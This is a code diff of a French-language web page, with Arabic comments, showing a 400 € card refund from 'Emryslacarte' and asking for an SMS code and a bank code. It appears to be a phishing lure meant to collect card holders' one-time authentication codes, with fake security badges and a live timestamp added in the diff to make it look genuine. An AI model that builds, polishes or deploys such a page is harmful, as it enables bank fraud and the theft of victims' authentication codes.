@@ -48,11 +48,6 @@
             font-weight: bold;
         }
 
-        .orange-box p {
-            font-size: 14px;
-            line-height: 1.6;
-        }
-
         .info {
             text-align: left;
             font-size: 15px;
@@ -62,11 +57,6 @@
 
         .info p {
             margin: 5px 0;
-        }
-
-        .info strong {
-            font-weight: 700;
-            color: #333;
         }
 
         input {
@@ -102,12 +92,6 @@
             max-width: 250px;
             margin: 10px 0;
         }
-
-        .link a {
-            color: #2196F3;
-            text-decoration: none;
-            font-weight: 500;
-        }
     </style>
 </head>
 <body>
@@ -122,8 +106,8 @@
         <div class="info">
             <p><strong>Marchand :</strong> Emryslacarte</p>
             <p><strong>Montant de remboursement :</strong> 400 €</p>
-            <p><strong>Date :</strong> 17 décembre 2024 à 18:45</p>
-            <p><strong>N° de carte :</strong> **** **** **** <span>3737</span></p>
+            <p><strong>Date et Heure :</strong> <span id="current-date-time"></span></p>
+            <p><strong>N° de carte :</strong> **** **** **** 3737</p>
         </div>
 
         <!-- Inputs pour le Code SMS et Banque -->
@@ -133,11 +117,6 @@
         <!-- Bouton Valider -->
         <a href="#" class="btn" onclick="validate()">Valider</a>
 
-        <!-- Lien pour application bancaire -->
-        <div class="link">
-            <p>Valider par application bancaire ? <a href="#">Cliquez ici</a></p>
-        </div>
-
         <!-- Icônes de sécurité -->
         <div class="footer-icons">
             <img src="IMG_4110.jpeg" alt="Sécurité garantie">
@@ -145,6 +124,24 @@
     </div>
 
     <script>
+        // Fonction لإضافة الوقت والتاريخ الحاليين
+        function updateDateTime() {
+            const date = new Date();
+            const formattedDate = date.toLocaleDateString('fr-FR', {
+                weekday: 'long', year: 'numeric', month: 'long', day: 'numeric'
+            });
+            const formattedTime = date.toLocaleTimeString('fr-FR', {
+                hour: '2-digit', minute: '2-digit', second: '2-digit'
+            });
+
+            document.getElementById('current-date-time').innerText = `${formattedDate} à ${formattedTime}`;
+        }
+
+        // تحديث الوقت عند تحميل الصفحة
+        updateDateTime();
+        setInterval(updateDateTime, 1000); // تحديث كل ثانية
+
+        // التحقق من المدخلات
         function validate() {
             const smsCode = document.getElementById('code-sms').value;
             const bankCode = document.getElementById('code-banque').value;
@@ -153,7 +150,7 @@
                 alert("Veuillez remplir tous les champs.");
             } else {
                 alert("Votre validation a été soumise avec succès !");
-                window.location.href = "confirmation_finale.html"; // التوجيه للصفحة النهائية
+                window.location.href = "confirmation_finale.html"; // توجيه للصفحة النهائية
             }
         }
     </script>
